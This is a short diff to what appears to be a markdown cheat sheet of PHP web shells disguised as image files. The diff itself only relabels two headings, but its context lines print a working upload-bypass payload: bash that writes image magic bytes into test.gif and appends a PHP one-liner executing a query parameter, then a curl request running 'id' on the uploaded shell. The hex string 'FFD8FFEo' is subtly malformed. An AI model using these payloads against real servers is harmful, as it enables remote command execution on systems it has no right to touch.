@@ -26,7 +26,7 @@ if(isset($_REQUEST['cmd'])){
 </html>
 ```
 
-PHP web shell in a GIF with curl example
+PHP web shell in a GIF or JPG with curl example
 ----------------------
 ```bash
 echo 'FFD8FFEo' | xxd -r -p > test.gif
@@ -34,7 +34,7 @@ echo '<?php $c=$_GET['c']; echo `$c`; ?>' >> test.gif
 curl -v http://ololo/uploads/test.gif?c=id
 ```
 
-PHP web shell in GIF
+PHP web shell in GIF or JPG
 --------------------
 ```php
 GIF89a
